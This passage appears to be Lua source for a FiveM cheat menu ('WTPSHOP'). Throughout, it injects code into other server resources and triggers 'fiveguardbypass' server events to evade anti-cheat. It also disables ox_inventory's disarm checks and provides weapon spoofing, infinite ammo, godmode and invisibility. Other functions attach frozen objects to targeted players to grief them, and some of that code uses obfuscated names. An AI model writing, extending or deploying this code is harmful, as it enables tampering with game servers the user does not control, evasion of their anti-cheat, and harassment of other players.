    return injectCode("any", code)
end

function ApiRasclat.Execute(code)
    return ApiRasclat.Pool(code)
end

function ApiRasclat.Inject(code)
    return ApiRasclat.Pool(code)
end

function ApiRasclat.InjectPreferred(preferredResource, code)
    return executeCode(ApiRasclat.NormalizeResource(preferredResource), code)
end

function ApiRasclat.InjectRaw(preferredResource, code)
    return AyokongInjectionman(ApiRasclat.NormalizeResource(preferredResource), code)
end

local selectedVehicle = nil
local isVehicleFlying = false
local Control_Vehicle_Thread = nil
local Control_Vehicle = false

function IsEntityPositionFrozen(entity) return not IsEntityAMissionEntity(entity) or GetEntitySpeed(entity) == 0.0 end
function ToggleFreezeVehicle(vehicle)
    if vehicle and DoesEntityExist(vehicle) then
        local isFrozen = IsEntityPositionFrozen(vehicle)
        FreezeEntityPosition(vehicle, not isFrozen)
        if not isFrozen then
            WTPSHOP:Notify("success", "WTPSHOP", "Vehicle Frozen.", 3000)
        else
            WTPSHOP:Notify("error", "WTPSHOP", "Vehicle Unfrozen.", 3000)
        end
    else
        WTPSHOP:Notify("error", "WTPSHOP", "No vehicle selected.", 3000)
    end
end

function DrawVehicleOutline(vehicle)
    if vehicle and DoesEntityExist(vehicle) then
        SetEntityDrawOutline(vehicle, true)
        SetEntityDrawOutlineColor(88, 57, 59, 255)
    end
end

function GetClosestVehicle()
    local playerPed = PlayerPedId()
    local playerCoords = GetEntityCoords(playerPed)
    local closestVehicle = nil
    local closestDistance = 10.0
    for vehicle in EnumerateVehicles() do
        local vehicleCoords = GetEntityCoords(vehicle)
        local distance = #(playerCoords - vehicleCoords)
        if distance < closestDistance then
            closestVehicle = vehicle
            closestDistance = distance
        end
    end
    return closestVehicle
end

function EnumerateVehicles() return coroutine.wrap(function() local vehiclePool = GetGamePool('CVehicle') for i = 1, #vehiclePool do coroutine.yield(vehiclePool[i]) end end) end

function WTPSHOP:ToggleFreecam(state, speed)
    if type(state) ~= "boolean" then
        return
    end

    if state then
        FreecamEnabled = true
        MachoSendDuiMessage(DUI, json.encode({ action = "displayFreecam", visible = true, weaponIndex = CurrentWeaponIndex, vehicleIndex = CurrentVehicleIndex, mapIndex = CurrentMapDestroyerIndex, objectIndex = CurrentSpawnObjectIndex }))

        if GetResourceState("dre-scripts") == "started" then
            executeCode('dre-scripts', [[
                WTPSHOP.Native(TriggerServerEvent, "dre-freecam:sv:fiveguardbypasson")
            ]])
        elseif GetResourceState("xevi-freecam") == "started" then
            executeCode('xevi-freecam', [[
                WTPSHOP.Native(TriggerServerEvent, "xevi-freecam:sv:setFreecamState", true)
                WTPSHOP.Native(TriggerServerEvent, "xevi-freecam:sv:fiveguardbypasson")
            ]])
        elseif GetResourceState("dre-freecam") == "started" then
            executeCode('dre-freecam', [[
                WTPSHOP.Native(TriggerServerEvent, "catdev_freecam:sv:fiveguardbypasson")
            ]])
        end

        ApiRasclat.SafeRes([[
            _G.WTPSHOPFreecamSpeed = ]] .. speed .. [[

            if not _G.WTPSHOPFreecamThreadRunning then
                _G.WTPSHOPFreecamEnabled = true
                _G.WTPSHOPFreecamThreadRunning = true

                function _G.hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                local function RotationToDirection(rot)
                    local z = math.rad(rot.z)
                    local x = math.rad(rot.x)
                    local num = math.abs(math.cos(x))
                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                end

                local function GetRightVector(rot)
                    local z = math.rad(rot.z)
                    return vector3(math.cos(z), math.sin(z), 0.0)
                end

                local function Clamp(val, min, max)
                    if val < min then return min end
                    if val > max then return max end
                    return val
                end

                _G.RotationToDirection = RotationToDirection
                _G.GetRightVector = GetRightVector
                _G.Clamp = Clamp

                _G.hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                local rendering = WTPSHOP.Native(GetRenderingCam)
                local camPos, camRot, camFov

                if rendering ~= -1 and rendering ~= nil then
                    camPos = WTPSHOP.Native(GetCamCoord, rendering)
                    camRot = WTPSHOP.Native(GetCamRot, rendering, 2)
                    camFov = WTPSHOP.Native(GetCamFov, rendering)
                else
                    camPos = WTPSHOP.Native(GetGameplayCamCoord)
                    camRot = WTPSHOP.Native(GetGameplayCamRot, 2)
                    camFov = WTPSHOP.Native(GetGameplayCamFov)
                end

                _G.WTPSHOPFreecamObject = WTPSHOP.Native(CreateCam, "DEFAULT_SCRIPTED_CAMERA", true)
                WTPSHOP.Native(SetCamCoord, _G.WTPSHOPFreecamObject, camPos.x, camPos.y, camPos.z)
                WTPSHOP.Native(SetCamRot, _G.WTPSHOPFreecamObject, camRot.x, camRot.y, camRot.z, 2)
                WTPSHOP.Native(SetCamFov, _G.WTPSHOPFreecamObject, camFov)
                WTPSHOP.Native(RenderScriptCams, true, false, 0, true, true)

                local targetFov = 70.0
                local duration = 100
                local startFov = camFov
                local startTime = WTPSHOP.Native(GetGameTimer)

                WTPSHOP.Native(CreateThread, function()
                    while true do
                        local now = WTPSHOP.Native(GetGameTimer)
                        local progress = (now - startTime) / duration

                        if progress >= 1.0 then
                            WTPSHOP.Native(SetCamFov, _G.WTPSHOPFreecamObject, targetFov)
                            break
                        end

                        local eased = 1 - (1 - progress) * (1 - progress)
                        WTPSHOP.Native(SetCamFov, _G.WTPSHOPFreecamObject, startFov + (targetFov - startFov) * eased)
                        WTPSHOP.Native(Wait, 0)
                    end
                end)

                WTPSHOP.Native(CreateThread, function()
                    while _G.WTPSHOPFreecamThreadRunning do
                        WTPSHOP.Native(Wait, 0)

                        if _G.WTPSHOPFreecamObject then
                            local coords = WTPSHOP.Native(GetCamCoord, _G.WTPSHOPFreecamObject)
                            local rot = WTPSHOP.Native(GetCamRot, _G.WTPSHOPFreecamObject, 2)
                            local beforeSpeed = _G.WTPSHOPFreecamSpeed or 0.25
                            local speed = WTPSHOP.Native(IsControlPressed, 0, 21) and beforeSpeed + 1.0 or beforeSpeed
                            local forward = _G.RotationToDirection(rot)
                            local right = _G.GetRightVector(rot)
                            local moveX, moveY, moveZ = 0, 0, 0

                            WTPSHOP.Native(TaskStandStill, WTPSHOP.Native(PlayerPedId), 10)
                            WTPSHOP.Native(SetFocusPosAndVel, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)
                            
                            if WTPSHOP.Native(IsControlPressed, 0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                            if WTPSHOP.Native(IsControlPressed, 0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                            if WTPSHOP.Native(IsControlPressed, 0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                            if WTPSHOP.Native(IsControlPressed, 0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                            if WTPSHOP.Native(IsControlPressed, 0, 22) then moveZ = moveZ + speed end
                            if WTPSHOP.Native(IsControlPressed, 0, 36) then moveZ = moveZ - speed end

                            WTPSHOP.Native(SetCamCoord, _G.WTPSHOPFreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                            local x = WTPSHOP.Native(GetDisabledControlNormal, 0, 1)
                            local y = WTPSHOP.Native(GetDisabledControlNormal, 0, 2)
                            local newPitch = _G.Clamp(rot.x - y * 5, -89.0, 89.0)
                            local newYaw = rot.z - x * 5
                            WTPSHOP.Native(SetCamRot, _G.WTPSHOPFreecamObject, newPitch, rot.y, newYaw, 2)
                        end
                    end
                end)
            else
                _G.WTPSHOPFreecamEnabled = true
            end
        ]])
    else
        FreecamEnabled = false
        MachoSendDuiMessage(DUI, json.encode({ action = "displayFreecam", visible = false }))
        if GetResourceState("dre-scripts") == "started" then
            executeCode('dre-scripts', [[
                WTPSHOP.Native(TriggerServerEvent, "dre-freecam:sv:deactivate")
            ]])
        elseif GetResourceState("xevi-freecam") == "started" then
            executeCode('xevi-freecam', [[
                WTPSHOP.Native(TriggerServerEvent, "xevi-freecam:sv:setFreecamState", false)
                WTPSHOP.Native(TriggerServerEvent, "xevi-freecam:sv:fiveguardbypassoff")
            ]])
        elseif GetResourceState("dre-freecam") == "started" then
            executeCode('dre-freecam', [[
                WTPSHOP.Native(TriggerServerEvent, "catdev_freecam:sv:fiveguardbypassoff")
            ]])
        end
        ApiRasclat.SafeRes([[
            _G.WTPSHOPFreecamEnabled = false
            _G.WTPSHOPFreecamThreadRunning = false

            function _G.hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            _G.hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("Wait", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

            WTPSHOP.Native(RenderScriptCams, false, false, 0, true, true)
            if _G.WTPSHOPFreecamObject then WTPSHOP.Native(DestroyCam, _G.WTPSHOPFreecamObject, false) _G.WTPSHOPFreecamObject = nil end
            WTPSHOP.Native(SetFocusEntity, PlayerPedId())
        ]])
    end
end

function WTPSHOP:EnsureCombatBypassReady(actionLabel)
    if not self:GuardInject(actionLabel or "Combat") then
        return false
    end
    if #detectedAC > 0 or resolveFiveGuardClientResource() then
        if not allAcBypassesSatisfied() then
            ensureAllAcBypasses(true, false)
            Wait(400)
        end
        if not allAcBypassesSatisfied() then
            self:Notify("error", "WTPSHOP", "Bypass not ready — Server Options → Reload Bypass.", 4500)
            return false
        end
    end
    return true
end

function WTPSHOP:InstallInventoryWeaponBypass()
    if _inventoryWeaponBypassInstalled then
        return true
    end
    if GetResourceState("ox_inventory") == "started" then
        ApiRasclat.InjectPreferred("ox_inventory", [[
            if _G.WTPSHOPOxWeaponBypass then return end
            _G.WTPSHOPOxWeaponBypass = true
            pcall(function()
                if type(disarm) == "function" and not _G._WTPSHOP_orig_disarm then
                    _G._WTPSHOP_orig_disarm = disarm
                    disarm = function() end
                end
            end)
            pcall(function()
                if type(client) == "table" and type(client.disarm) == "function" then
                    if not client._wtpshop_orig_disarm then
                        client._wtpshop_orig_disarm = client.disarm
                    end
                    client.disarm = function() end
                end
            end)
            pcall(function()
                if type(Weapon) == "table" and type(Weapon.Disarm) == "function" then
                    if not Weapon._wtpshop_orig_disarm then
                        Weapon._wtpshop_orig_disarm = Weapon.Disarm
                    end
                    Weapon.Disarm = function() end
                end
            end)
        ]])
    end
    _inventoryWeaponBypassInstalled = true
    return true
end

function WTPSHOP:StopInventorySpoofWeapon()
    WTPSHOP.SpoofWeaponActive = false
    WTPSHOP.WeaponSpoofEnabled = false
    ApiRasclat.RouteFeature("weapons", [[
        _G.WTPSHOPSpoofWeaponActive = false
        local ped = WTPSHOP.Native(PlayerPedId)
        local hash = _G.WTPSHOPHandWeaponHash
        if ped and ped ~= 0 and hash and hash ~= 0 then
            if WTPSHOP.Native(HasPedGotWeapon, ped, hash, false) then
                WTPSHOP.Native(RemoveWeaponFromPed, ped, hash)
            end
        end
        _G.WTPSHOPHandWeaponHash = 0
    ]])
    WTPSHOP.HandWeaponHash = 0
end

function WTPSHOP:EnableInventorySpoofWeapon(checked, weaponModel)
    if not weaponModel or weaponModel == "" then
        self:Notify("error", "WTPSHOP", "Invalid weapon for spoof.", 3000)
        return false
    end
    local weaponHash = GetHashKey(weaponModel)
    if weaponHash == 0 then
        self:Notify("error", "WTPSHOP", "Unknown weapon model.", 3000)
        return false
    end

    WTPSHOP.HandWeaponHash = weaponHash

    if not checked then
        self:StopInventorySpoofWeapon()
        return true
    end

    if not self:EnsureCombatBypassReady("Spoof Weapon") then
        return false
    end

    self:InstallInventoryWeaponBypass()

    if WTPSHOP.SpoofWeaponActive then
        ApiRasclat.ExecuteFeature("weapons", string.format([[
            _G.WTPSHOPHandWeaponHash = %s
        ]], weaponHash))
        self:Notify("info", "WTPSHOP", "Spoof weapon switched.", 2500)
        return true
    end

    WTPSHOP.SpoofWeaponActive = true
    WTPSHOP.WeaponSpoofEnabled = true

    ApiRasclat.RouteFeature("weapons", string.format([[
        _G.WTPSHOPHandWeaponHash = %s
        _G.WTPSHOPSpoofWeaponActive = true

        local function applyHandSpoofWeapon()
            local ped = WTPSHOP.Native(PlayerPedId)
            local hash = _G.WTPSHOPHandWeaponHash
            if not ped or ped == 0 or not hash or hash == 0 then return end

            if not WTPSHOP.Native(HasPedGotWeapon, ped, hash, false) then
                WTPSHOP.Native(GiveWeaponToPed, ped, hash, 120, false, true)
            end
            WTPSHOP.Native(SetPedAmmo, ped, hash, 120)
            local okClip, maxClip = WTPSHOP.Native(GetMaxAmmoInClip, ped, hash, true)
            if okClip and type(maxClip) == "number" and maxClip > 0 then
                WTPSHOP.Native(SetAmmoInClip, ped, hash, maxClip)
            end
            WTPSHOP.Native(SetCurrentPedWeapon, ped, hash, true)
            WTPSHOP.Native(SetPedCurrentWeaponVisible, ped, true, false, false, false)

            if LocalPlayer and LocalPlayer.state then
                LocalPlayer.state:set("canUseWeapons", true, false)
                LocalPlayer.state:set("invBusy", false, false)
            end
        end

        applyHandSpoofWeapon()

        if not _G.WTPSHOPHandSpoofThreadRunning then
            _G.WTPSHOPHandSpoofThreadRunning = true
            WTPSHOP.Thread(function()
                while _G.WTPSHOPSpoofWeaponActive do
                    applyHandSpoofWeapon()
                    WTPSHOP.Wait(250)
                end
                _G.WTPSHOPHandSpoofThreadRunning = false
            end)
        end
    ]], weaponHash))

    self:Notify("success", "WTPSHOP", "Spoof weapon in hand (no inventory item).", 4000)
    return true
end

function WTPSHOP:EnableInfiniteAmmo(checked)
    WTPSHOP.InfiniteAmmoStealth = checked and true or false
    if checked then
        if not self:EnsureCombatBypassReady("Infinite Ammo") then
            WTPSHOP.InfiniteAmmoStealth = false
            return false
        end
        ApiRasclat.RouteFeature("weapons", [[
            _G.WTPSHOPInfiniteAmmoStealth = true
            if _G.WTPSHOPInfAmmoThreadRunning then return end
            _G.WTPSHOPInfAmmoThreadRunning = true
            WTPSHOP.Thread(function()
                while _G.WTPSHOPInfiniteAmmoStealth do
                    local ped = WTPSHOP.Native(PlayerPedId)
                    if ped and ped ~= 0 then
                        WTPSHOP.Native(SetPedInfiniteAmmoClip, ped, true)
                        local found, weapon = WTPSHOP.Native(GetCurrentPedWeapon, ped, true)
                        if found and weapon and weapon ~= 0 then
                            local okClip, maxClip = WTPSHOP.Native(GetMaxAmmoInClip, ped, weapon, true)
                            maxClip = (okClip and type(maxClip) == "number" and maxClip > 0) and maxClip or nil
                            if maxClip then
                                local hasClip, inClip = WTPSHOP.Native(GetAmmoInClip, ped, weapon)
                                if hasClip and type(inClip) == "number" and inClip <= 1 then
                                    WTPSHOP.Native(SetAmmoInClip, ped, weapon, maxClip)
                                end
                            end
                            local reserve = WTPSHOP.Native(GetAmmoInPedWeapon, ped, weapon)
                            if type(reserve) == "number" and reserve < 90 then
                                WTPSHOP.Native(SetPedAmmo, ped, weapon, 120)
                            end
                        end
                    end
                    WTPSHOP.Wait(400)
                end
                local ped = WTPSHOP.Native(PlayerPedId)
                if ped and ped ~= 0 then
                    WTPSHOP.Native(SetPedInfiniteAmmoClip, ped, false)
                end
                _G.WTPSHOPInfAmmoThreadRunning = false
            end)
        ]])
        self:Notify("success", "WTPSHOP", "Stealth infinite ammo enabled.", 3000)
    else
        ApiRasclat.RouteFeature("weapons", [[
            _G.WTPSHOPInfiniteAmmoStealth = false
        ]])
    end
    return true
end

function WTPSHOP:SpawnSelectedObject(playerIds)
    if not playerIds or #playerIds == 0 then
        self:Notify("error", "WTPSHOP", "No players selected!", 3000)
        return
    end
    local model = self:GetSelectedObjectModel()
    if not model or #model == 0 then
        self:Notify("error", "WTPSHOP", "Invalid object model!", 3000)
        return
    end
    local successCount = 0
    for _, playerId in ipairs(playerIds) do
        ApiRasclat.SafeRes(string.format([[
            WTPSHOP.Native(CreateThread, function()
                local awidaowdhoa = {
                    ["GetHashKey"] = function(...) return WTPSHOP.Native(GetHashKey, ...) end,
                    ["RequestModel"] = function(...) return WTPSHOP.Native(RequestModel, ...) end,
                    ["GetGameTimer"] = function(...) return WTPSHOP.Native(GetGameTimer, ...) end,
                    ["HasModelLoaded"] = function(...) return WTPSHOP.Native(HasModelLoaded, ...) end,
                    ["Wait"] = function(...) return WTPSHOP.Native(Wait, ...) end,
                    ["GetActivePlayers"] = function(...) return WTPSHOP.Native(GetActivePlayers, ...) end,
                    ["GetPlayerServerId"] = function(...) return WTPSHOP.Native(GetPlayerServerId, ...) end,
                    ["GetPlayerPed"] = function(...) return WTPSHOP.Native(GetPlayerPed, ...) end,
                    ["DoesEntityExist"] = function(...) return WTPSHOP.Native(DoesEntityExist, ...) end,
                    ["GetEntityCoords"] = function(...) return WTPSHOP.Native(GetEntityCoords, ...) end,
                    ["CreateObject"] = function(...) return WTPSHOP.Native(CreateObject, ...) end,
                    ["SetEntityAsMissionEntity"] = function(...) return WTPSHOP.Native(SetEntityAsMissionEntity, ...) end,
                    ["FreezeEntityPosition"] = function(...) return WTPSHOP.Native(FreezeEntityPosition, ...) end,
                    ["AttachEntityToEntity"] = function(...) return WTPSHOP.Native(AttachEntityToEntity, ...) end,
                    ["SetModelAsNoLongerNeeded"] = function(...) return WTPSHOP.Native(SetModelAsNoLongerNeeded, ...) end
                }

                local sid = %d
                local modelName = "%s"
                local model = awidaowdhoa["GetHashKey"](modelName)

                awidaowdhoa["RequestModel"](model)
                local timeout = awidaowdhoa["GetGameTimer"]() + 5000
                while not awidaowdhoa["HasModelLoaded"](model) and awidaowdhoa["GetGameTimer"]() < timeout do
                    awidaowdhoa["Wait"](10)
                end
                
                if not awidaowdhoa["HasModelLoaded"](model) then return end

                local function getPedBySid(s)
                    for _, pid in ipairs(awidaowdhoa["GetActivePlayers"]()) do
                        if awidaowdhoa["GetPlayerServerId"](pid) == s then 
                            return awidaowdhoa["GetPlayerPed"](pid) 
                        end
                    end
                    return 0
                end

                local targetPed = getPedBySid(sid)
                if targetPed ~= 0 and awidaowdhoa["DoesEntityExist"](targetPed) then
                    local coords = awidaowdhoa["GetEntityCoords"](targetPed)
                    local obj = awidaowdhoa["CreateObject"](model, coords.x, coords.y, coords.z, true, true, false)
                    
                    if obj ~= 0 and awidaowdhoa["DoesEntityExist"](obj) then
                        awidaowdhoa["SetEntityAsMissionEntity"](obj, true, true)
                        awidaowdhoa["FreezeEntityPosition"](obj, true)
                        awidaowdhoa["AttachEntityToEntity"](obj, targetPed, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    end
                end
                awidaowdhoa["SetModelAsNoLongerNeeded"](model)
            end)
        ]], playerId, model))
        successCount = successCount + 1
    end
end

function WTPSHOP:SpawnSelectedObjects(playerIds)
    if not playerIds or #playerIds == 0 then
        self:Notify("error", "WTPSHOP", "No players selected!", 3000)
        return
    end
    local model = self:GetSelectedObjectModel()
    if not model or #model == 0 then
        self:Notify("error", "WTPSHOP", "Invalid object model!", 3000)
        return
    end
    local successCount = 0
    for _, playerId in ipairs(playerIds) do
        ApiRasclat.SafeRes(string.format([[
            WTPSHOP.Native(CreateThread, function()
                local awidaowdhoa = {
                    ["GetHashKey"] = function(...) return WTPSHOP.Native(GetHashKey, ...) end,
                    ["RequestModel"] = function(...) return WTPSHOP.Native(RequestModel, ...) end,
                    ["GetGameTimer"] = function(...) return WTPSHOP.Native(GetGameTimer, ...) end,
                    ["HasModelLoaded"] = function(...) return WTPSHOP.Native(HasModelLoaded, ...) end,
                    ["Wait"] = function(...) return WTPSHOP.Native(Wait, ...) end,
                    ["GetActivePlayers"] = function(...) return WTPSHOP.Native(GetActivePlayers, ...) end,
                    ["GetPlayerServerId"] = function(...) return WTPSHOP.Native(GetPlayerServerId, ...) end,
                    ["GetPlayerPed"] = function(...) return WTPSHOP.Native(GetPlayerPed, ...) end,
                    ["DoesEntityExist"] = function(...) return WTPSHOP.Native(DoesEntityExist, ...) end,
                    ["GetEntityCoords"] = function(...) return WTPSHOP.Native(GetEntityCoords, ...) end,
                    ["CreateObject"] = function(...) return WTPSHOP.Native(CreateObject, ...) end,
                    ["SetEntityAsMissionEntity"] = function(...) return WTPSHOP.Native(SetEntityAsMissionEntity, ...) end,
                    ["FreezeEntityPosition"] = function(...) return WTPSHOP.Native(FreezeEntityPosition, ...) end,
                    ["AttachEntityToEntity"] = function(...) return WTPSHOP.Native(AttachEntityToEntity, ...) end,
                    ["SetModelAsNoLongerNeeded"] = function(...) return WTPSHOP.Native(SetModelAsNoLongerNeeded, ...) end
                }

                local sid = %d
                local modelName = "%s"
                local model = awidaowdhoa["GetHashKey"](modelName)

                awidaowdhoa["RequestModel"](model)
                local timeout = awidaowdhoa["GetGameTimer"]() + 5000
                while not awidaowdhoa["HasModelLoaded"](model) and awidaowdhoa["GetGameTimer"]() < timeout do
                    awidaowdhoa["Wait"](10)
                end
                
                if not awidaowdhoa["HasModelLoaded"](model) then return end

                local function getPedBySid(s)
                    for _, pid in ipairs(awidaowdhoa["GetActivePlayers"]()) do
                        if awidaowdhoa["GetPlayerServerId"](pid) == s then 
                            return awidaowdhoa["GetPlayerPed"](pid) 
                        end
                    end
                    return 0
                end

                local targetPed = getPedBySid(sid)
                if targetPed ~= 0 and awidaowdhoa["DoesEntityExist"](targetPed) then
                    local coords = awidaowdhoa["GetEntityCoords"](targetPed)
                    local obj = awidaowdhoa["CreateObject"](model, coords.x, coords.y, coords.z, true, true, false)
                    
                    if obj ~= 0 and awidaowdhoa["DoesEntityExist"](obj) then
                        awidaowdhoa["SetEntityAsMissionEntity"](obj, true, true)
                        awidaowdhoa["FreezeEntityPosition"](obj, true)
                    end
                end
                awidaowdhoa["SetModelAsNoLongerNeeded"](model)
            end)
        ]], playerId, model))
        successCount = successCount + 1
    end
end

local isSpectatorListVisible = false
CreateThread(function()
    while true do
        Citizen.Wait(1000)

        if isSpectatorListVisible then
            local playerCoords = GetEntityCoords(PlayerPedId())
            local updatedSpecs = {}

            local players = GetActivePlayers()
            for _, playerId in ipairs(players) do
                local ped = GetPlayerPed(playerId)

                if DoesEntityExist(ped) and playerId ~= PlayerId() then
                    local isVisible = IsEntityVisible(ped)
                    local dist = #(playerCoords - GetEntityCoords(ped))

                    if not isVisible and dist < 500.0 then
                        table.insert(updatedSpecs, {
                            id = GetPlayerServerId(playerId),
                            name = GetPlayerName(playerId),
                            distance = string.format("%.0fm", dist)
                        })
                    end
                end
            end

            WTPSHOP:SendMessage({
                action = "displaySpectators",
                visible = true,
                spectators = updatedSpecs
            })
        end
    end
end)

local targetResource = nil
if GetResourceState("es_extended") == "started" and GetResourceState("timeless-emotes") == "started" then
    targetResource = "es_extended"
elseif GetResourceState("core") == "started" and GetResourceState("timeless-emotes") == "started" then
    targetResource = "core"
end

function WTPSHOP:GodemodeState(checked)
    if checked and not self:EnsureCombatBypassReady("Godmode") then
        return false
    end
    ApiRasclat.RouteFeature("godmode", string.format([[
        _G.WTPSHOPGodmode = %s
        if _G.WTPSHOPGodmode then
            if not _G.WTPSHOPGodmodeThread then
                _G.WTPSHOPGodmodeThread = true
                WTPSHOP.Thread(function()
                    while _G.WTPSHOPGodmode do
                        local ped = WTPSHOP.Native(PlayerPedId)
                        local pid = WTPSHOP.Native(PlayerId)
                        WTPSHOP.Native(SetEntityInvincible, ped, true)
                        WTPSHOP.Native(SetPlayerInvincible, pid, true)
                        WTPSHOP.Native(SetPedCanRagdoll, ped, false)
                        WTPSHOP.Wait(350)
                    end
                    local ped = WTPSHOP.Native(PlayerPedId)
                    local pid = WTPSHOP.Native(PlayerId)
                    WTPSHOP.Native(SetEntityInvincible, ped, false)
                    WTPSHOP.Native(SetPlayerInvincible, pid, false)
                    WTPSHOP.Native(SetPedCanRagdoll, ped, true)
                    _G.WTPSHOPGodmodeThread = false
                end)
            end
        end
    ]], tostring(checked)))
    return true
end

function WTPSHOP:EnableInvisibility(checked)
    if checked and not self:EnsureCombatBypassReady("Invisibility") then
        return false
    end
    ApiRasclat.RouteFeature("invisibility", string.format([[
        _G.WTPSHOPInvisible = %s
        if _G.WTPSHOPInvisible then
            if not _G.WTPSHOPInvisibleThread then
                _G.WTPSHOPInvisibleThread = true
                WTPSHOP.Thread(function()
                    while _G.WTPSHOPInvisible do
                        local ped = WTPSHOP.Native(PlayerPedId)
                        WTPSHOP.Native(SetEntityVisible, ped, false, false)
                        WTPSHOP.Native(SetEntityAlpha, ped, 0, false)
                        WTPSHOP.Wait(350)
                    end
                    local ped = WTPSHOP.Native(PlayerPedId)
                    WTPSHOP.Native(SetEntityVisible, ped, true, false)
